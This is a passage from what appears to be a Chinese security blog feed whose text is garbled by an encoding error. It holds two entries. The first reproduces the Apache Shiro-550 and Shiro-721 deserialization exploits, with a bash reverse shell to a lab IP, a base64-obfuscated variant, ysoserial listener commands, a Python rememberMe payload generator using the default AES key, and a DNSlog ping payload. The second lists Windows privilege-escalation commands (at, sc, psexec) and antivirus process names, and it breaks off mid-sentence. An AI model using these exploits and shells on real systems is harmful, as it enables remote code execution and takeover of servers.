      <link href="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><h1 id="Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"><a href="#Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰" class="headerlink" title="Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"></a>Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰</h1><p><strong>å½±å“ç‰ˆæœ¬:Apache Shiro &lt; 1.2.4</strong></p><p><strong>æ¼æ´åŸç†ï¼š</strong>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚é‚£ä¹ˆï¼ŒPayloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼š<br>å‘½ä»¤=&gt;åºåˆ—åŒ–=&gt;AESåŠ å¯†=&gt;base64ç¼–ç =&gt;RememberMe Cookieå€¼<br>åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯AESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†,Payloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ã€‚</p><p><strong>ç‰¹å¾åˆ¤æ–­</strong></p><p>è¿”å›åŒ…ä¸­åŒ…å«rememberMe=deleteMeå­—æ®µã€‚</p><p><strong>ç¯å¢ƒæ­å»º</strong></p><pre><code class="text">è·å–dockeré•œåƒdocker pull medicean/vulapps:s_shiro_1å¯åŠ¨dockeré•œåƒï¼šdocker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>å·¥å…·å‡†å¤‡</strong></p><p>mavené…ç½®:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3åœ¨/etc/profileæœ«å°¾æ·»åŠ mavenç¯å¢ƒå˜é‡:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>ä¸‹è½½ysoserialå¹¶æ‰“åŒ…:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>ç”Ÿæˆçš„å·¥å…·åœ¨ysoserial/targetæ–‡ä»¶ä¸­ã€‚</p><p><strong>å¤ç°æµç¨‹</strong></p><p><strong>1ã€æ£€æŸ¥æ˜¯å¦å­˜åœ¨é»˜è®¤çš„key</strong></p><p>æ¨èä½¿ç”¨Shiro_exploitæ£€æµ‹:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>å¦‚å›¾æˆåŠŸè·å–å¯†é’¥</p><p><strong>2ã€ncç›‘å¬æœ¬åœ°ç«¯å£</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3ã€ç¼–å†™åå¼¹shellä»£ç </strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#è¿›è¡Œbase64ç¼–ç bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4ã€é€šè¿‡ysoserialä¸­JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬5555ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5ã€ä½¿ç”¨shiro.pyç”Ÿæˆpayload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:æ³¨æ„shiro.pyè¦åœ¨targetç›®å½•ä¸‹</p><p><strong>6ã€æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>ç”¨ä¸Šæ–‡äº§ç”Ÿçš„payloadè¿›è¡Œæ›¿æ¢</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>å‘é€</p><p><strong>7ã€æˆåŠŸåå¼¹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attackï¼ˆShiro-721ï¼‰"><a href="#Shiro-Padding-Oracle-Attackï¼ˆShiro-721ï¼‰" class="headerlink" title="Shiro Padding Oracle Attackï¼ˆShiro-721ï¼‰"></a>Shiro Padding Oracle Attackï¼ˆShiro-721ï¼‰</h1><p><strong>æ¼æ´åŸç†</strong></p><p>ç”±äºApache Shiro cookieä¸­é€šè¿‡ AES-128-CBC æ¨¡å¼åŠ å¯†çš„rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨æˆ·å¯é€šè¿‡Padding  Oracle åŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<br>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong><br>1ã€ç™»å½•Shiroç½‘ç«™ï¼Œä»cookieä¸­è·å¾—rememberMeå­—æ®µçš„å€¼ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2ã€åˆ©ç”¨DNSlogæ¢æµ‹ï¼Œé€šè¿‡ysoserialå·¥å…·payloadã€‚</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3ã€ä½¿ç”¨rememberMeå€¼ä½œä¸ºprefixï¼ŒåŠ è½½Payloadï¼Œè¿›è¡ŒPadding Oracleæ”»å‡»ã€‚<br>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>çˆ†ç ´æˆåŠŸï¼Œè¾“å‡ºResultï¼š</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4ã€ä½¿ç”¨æ„é€ çš„rememberMeæ”»å‡»å­—ç¬¦ä¸²é‡æ–°è¯·æ±‚ç½‘ç«™<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5ã€æˆåŠŸè§¦å‘Payloadï¼Œåœ¨DNSLogè·å–åˆ°ç›®æ ‡IPã€‚<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·"></a>ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·</h1><p>ShiroExploitï¼šæ”¯æŒå¯¹Shiro-550ï¼ˆç¡¬ç¼–ç ç§˜é’¥ï¼‰å’ŒShiro-721ï¼ˆPadding Oracleï¼‰çš„ä¸€é”®åŒ–æ£€æµ‹ï¼Œæ”¯æŒç®€å•å›æ˜¾ã€‚<br>Githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550ï¼Œåªéœ€è¾“å…¥urlï¼Œå³å¯å®Œæˆè‡ªåŠ¨åŒ–æ£€æµ‹å’Œæ¼æ´åˆ©ç”¨ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721ï¼Œéœ€è¾“å…¥urlï¼Œæä¾›ä¸€ä¸ªæœ‰æ•ˆçš„rememberMe Cookieï¼Œå¹¶æŒ‡å®šç›®æ ‡æ“ä½œç³»ç»Ÿç±»å‹ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>å‚è€ƒé“¾æ¥:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shrio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windowsææƒæ€»ç»“</title>
      <link href="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>ä¸ºä»€ä¹ˆè¦ææƒï¼šå½“æˆåŠŸé€šè¿‡80æˆ–è€…443ç«¯å£é€šè¿‡webæœåŠ¡æ¸—é€æ—¶ï¼Œå¸¸å¸¸æ˜¯www-data ã€‚æ— æ³•æ‰§è¡Œç®¡ç†å‘˜æƒé™ä¸‹çš„ä¸€ä¸‹å‘½ä»¤æˆ–è€…è¯»å–ä¸€äº›é‡è¦æ–‡ä»¶ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦ææƒï¼Œåœ¨ç®¡ç†å‘˜æƒé™ä¸‹ï¼Œè¿˜å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆå…¶ä»–åé—¨æ–‡ä»¶æˆ–è€…ä¸€äº›éšè—åé—¨ã€‚æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯å…¶ä»–ç«¯å£ç­‰æ“ä½œï¼Œè¾¾åˆ°æƒé™æŒç»­æ§åˆ¶ã€‚ç‰¹åˆ«æ˜¯windowså­˜åœ¨åŸŸï¼Œæ‰€ä»¥éœ€è¦æœ€é«˜æƒé™ï¼Œæ›´æ–¹ä¾¿åç»­çš„æ¸—é€ã€‚</p><p>ææƒå¯åˆ†ä¸ºçºµå‘ææƒä¸æ¨ªå‘ææƒï¼šçºµå‘ææƒï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ï¼›æ¨ªå‘ææƒï¼šè·å–åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚</p><p>Windowså¸¸ç”¨çš„ææƒæ–¹æ³•æœ‰ï¼šç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒã€æ•°æ®åº“ææƒã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒã€ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒã€WEBä¸­é—´ä»¶æ¼æ´ææƒã€DLLåŠ«æŒææƒã€æ»¥ç”¨é«˜å±æƒé™ä»¤ç‰Œææƒã€ç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒç­‰</p><h1 id="å¸¸è§„ä¿¡æ¯æœé›†"><a href="#å¸¸è§„ä¿¡æ¯æœé›†" class="headerlink" title="å¸¸è§„ä¿¡æ¯æœé›†"></a>å¸¸è§„ä¿¡æ¯æœé›†</h1><p>çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ä¸æ®†</p><p>å½“ä»¥ä½æƒç”¨æˆ·è¿›å»ä¸€ä¸ªé™Œç”Ÿçš„windowsæœºå™¨åï¼Œæ— è®ºæ˜¯ææƒè¿˜æ˜¯åç»­åšä»€ä¹ˆï¼Œç¬¬ä¸€æ­¥è‚¯å®šè¦å°½å¯èƒ½çš„æœé›†ä¿¡æ¯ã€‚</p><h2 id="å¸¸è§„ä¿¡æ¯æœé›†-1"><a href="#å¸¸è§„ä¿¡æ¯æœé›†-1" class="headerlink" title="å¸¸è§„ä¿¡æ¯æœé›†"></a>å¸¸è§„ä¿¡æ¯æœé›†</h2><pre><code class="text">systeminfo æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯  hostname ä¸»æœºå  net user æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯  netstat -ano|find &quot;3389&quot; æŸ¥çœ‹æœåŠ¡pidå·  wmic os get caption æŸ¥çœ‹ç³»ç»Ÿå  wmic qfe get Description,HotFixID,InstalledOn æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯  wmic product get name,version æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº  wmic service list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡  wmic process list brief æŸ¥è¯¢æœ¬æœºè¿›ç¨‹  net share æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨  netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®</code></pre><h2 id="å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š"><a href="#å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š" class="headerlink" title="å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š"></a>å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š</h2><pre><code class="text">360sd.exe 360æ€æ¯’  360tray.exe 360å®æ—¶ä¿æŠ¤  ZhuDongFangYu.exe 360ä¸»åŠ¨é˜²å¾¡  KSafeTray.exe é‡‘å±±å«å£«  SafeDogUpdateCenter.exe å®‰å…¨ç‹—  McAfee McShield.exe McAfee  egui.exe NOD32  AVP.exe å¡å·´æ–¯åŸº  avguard.exe å°çº¢ä¼  bdagent.exe BitDefender</code></pre><h2 id="è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š"><a href="#è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š" class="headerlink" title="è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š"></a>è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š</h2><pre><code class="text">æœºå™¨çš„ç³»ç»ŸåŠå…¶ç‰ˆæœ¬æœºå™¨çš„æ‰“è¡¥ä¸æƒ…å†µæœºå™¨å®‰è£…çš„æœåŠ¡æœºå™¨çš„é˜²ç«å¢™ç­–ç•¥é…ç½®æœºå™¨çš„é˜²æŠ¤è½¯ä»¶æƒ…å†µ</code></pre><h1 id="ææƒæ¼æ´"><a href="#ææƒæ¼æ´" class="headerlink" title="ææƒæ¼æ´"></a>ææƒæ¼æ´</h1><h2 id="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"><a href="#ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"></a>ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</h2><h3 id="æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ"><a href="#æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ" class="headerlink" title="æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ"></a>æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ</h3><pre><code class="text">systeminfo  #æŸ¥çœ‹è¡¥ä¸wmic qfe get Description,HotFixID,InstalledOn  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯#Powershellæ‰«æImport-Module C:\Sherlock.ps1Find-AllVulns</code></pre><h3 id="MSFåæ¸—é€æ‰«æ"><a href="#MSFåæ¸—é€æ‰«æ" class="headerlink" title="MSFåæ¸—é€æ‰«æ"></a>MSFåæ¸—é€æ‰«æ</h3><pre><code class="text">post/windows/gather/enum_patches</code></pre><p>åˆ©ç”¨ï¼ˆVulmapã€Wesã€WindowsVulnScanï¼‰å¯¹æ¯”è¡¥ä¸è¿›è€Œè¿›è¡Œææƒ</p><h2 id="atææƒ"><a href="#atææƒ" class="headerlink" title="atææƒ"></a>atææƒ</h2><p><strong>åœ¨Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨atå‘½ä»¤å°†Administratoræƒé™æå‡è‡³systemæƒé™ã€‚</strong></p><p>ATå‘½ä»¤æ˜¯Windows XPä¸­å†…ç½®çš„å‘½ä»¤ï¼Œå®ƒä¹Ÿå¯ä»¥åª²ç¾Windowsä¸­çš„â€è®¡åˆ’ä»»åŠ¡â€ï¼Œè€Œä¸”åœ¨è®¡åˆ’çš„å®‰æ’ã€ä»»åŠ¡çš„ç®¡ç†ã€å·¥ä½œäº‹åŠ¡çš„å¤„ç†æ–¹é¢ï¼ŒATå‘½ä»¤å…·æœ‰æ›´å¼ºå¤§æ›´ç¥é€šçš„åŠŸèƒ½ã€‚ATå‘½ä»¤å¯åœ¨æŒ‡å®šæ—¶é—´å’Œæ—¥æœŸã€åœ¨æŒ‡å®šè®¡ç®—æœºä¸Šè¿è¡Œå‘½ä»¤å’Œç¨‹åºã€‚</p><p>å› ä¸ºatå‘½ä»¤é»˜è®¤æ˜¯ä»¥systemæƒé™ä¸‹è¿è¡Œçš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œè¿›è¡Œææƒ</p><p>at æ—¶é—´ /interactive cmd å…¶ä¸­é‡Œé¢çš„/interactiveå‚æ•°æ˜¯å¼€å¯äº¤äº’æ¨¡å¼</p><p>è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œåˆ°æ—¶é—´åè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªcmdçª—å£</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225229034.png" alt="image-20220312225229034"></p><p>æ­¤æ—¶æ¡Œé¢è¿˜æ˜¯</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225516674.png" alt="image-20220312225516674"></p><p>åˆ©ç”¨systemæƒé™æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œç»“æŸæ¡Œé¢è¿›ç¨‹</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225723090.png" alt="image-20220312225723090"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225450882.png" alt="image-20220312225450882"></p><p>å†é‡æ–°æ‰“å¼€</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225804841.png" alt="image-20220312225804841"></p><p>ç”±æ­¤å¯ä»¥å®ç°ä¸msfçš„è”åŠ¨</p><p>åœ¨webshllçš„cmdä¸­æ‰§è¡Œ  at æ—¶é—´ /interactive msfçš„åé—¨ç¨‹åºã€‚(æ³¨ï¼šè¿™é‡Œçš„æƒé™ä¸€å®šè¦æ˜¯Administrator)</p><p>ä¼šç›´æ¥åå¼¹å›systemæƒé™çš„ä¼šè¯</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312230306281.png" alt="image-20220312230306281"></p><h2 id="scææƒ"><a href="#scææƒ" class="headerlink" title="scææƒ"></a>scææƒ</h2><p><strong>é€‚ç”¨äºwindows 7/8ã€03/08ã€12/16</strong></p><p>å› ä¸ºatå‘½ä»¤åœ¨win7ï¼Œwin8ç­‰æ›´é«˜ç‰ˆæœ¬çš„ç³»ç»Ÿä¸Šéƒ½å·²ç»å–æ¶ˆæ‰äº†ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æ›´é«˜ç‰ˆæœ¬çš„windowsæ“ä½œç³»ç»Ÿä¸Šæˆ‘ä»¬å¯ä»¥ç”¨scå‘½ä»¤è¿›è¡Œææƒ</p><p>SCå‘½ä»¤æ˜¯XPç³»ç»Ÿä¸­åŠŸèƒ½å¼ºå¤§çš„DOSå‘½ä»¤,SCå‘½ä»¤èƒ½ä¸â€æœåŠ¡æ§åˆ¶å™¨â€å’Œå·²å®‰è£…è®¾å¤‡è¿›è¡Œé€šè®¯ã€‚SCæ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ å°±æ˜¯scå¯ä»¥å¯åŠ¨ä¸€ä¸ªæœåŠ¡</p><p>ææƒå‘½ä»¤</p><pre><code class="text">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact #è®¾ç½®ä¸€ä¸ªå¯åŠ¨cmdçª—å£çš„æœåŠ¡sc start systemcmd # å¯åŠ¨è¯¥æœåŠ¡åˆ›å»ºä¸€ä¸ªåå«syscmdçš„cmdæœåŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠbinPathæ¢æˆæœ¨é©¬çš„è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥è·å¾—ä¸€ä¸ªsystemæƒé™çš„ä¼šè¯</code></pre><p>å…¶ä¸­systemcmdæ˜¯æœåŠ¡åç§°ï¼Œå¯ä»¥éšæ„å¡«å†™ï¼Œbinpathæ˜¯å¯åŠ¨çš„å‘½ä»¤ï¼Œtype=ownæ˜¯æŒ‡æœåŠ¡è¿™ä¸ªæœåŠ¡å±äºè°ï¼Œtype=interactã€‚è¿™é‡Œå†è§£é‡Šä¸€ä¸‹ cmd/k start è¿™ä¸ªå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯å¯åŠ¨ä¸€ä¸ªæ–°çš„cmdçª—å£</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312231452287.png" alt="image-20220312231452287"></p><h2 id="psexecææƒ"><a href="#psexecææƒ" class="headerlink" title="psexecææƒ"></a>psexecææƒ</h2><p>**é€‚ç”¨ç‰ˆæœ¬ï¼šWin2003 &amp; Win2008 **</p><p><strong>å¾®è½¯å®˜æ–¹å·¥å…·åŒ…</strong>ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><strong>ææƒå‘½ä»¤</strong>ï¼š</p><pre><code class="text">PsExec.exe /accepteula /s \\127.0.0.1 cmd #ç›´æ¥äº¤äº’å¼shellpsexec.exe -accepteula -s -i -d cmd.exe #å¼¹å‡ºä¸€ä¸ªcmdçª—å£</code></pre><p>å¼€å¯çš„cmdçª—å£ä¹Ÿæ˜¯systemæƒé™</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312232849689.png" alt="image-20220312232849689"></p><h2 id="ç»•è¿‡UACææƒ"><a href="#ç»•è¿‡UACææƒ" class="headerlink" title="ç»•è¿‡UACææƒ"></a>ç»•è¿‡UACææƒ</h2><h3 id="UACç®€ä»‹"><a href="#UACç®€ä»‹" class="headerlink" title="UACç®€ä»‹"></a><strong>UACç®€ä»‹</strong></h3><p><strong>1.ä»€ä¹ˆæ˜¯ç”¨æˆ·å¸æˆ·æ§åˆ¶(UAC)ï¼Ÿ</strong></p><p>Microsoftçš„Windows Vistaå’ŒWindows Server 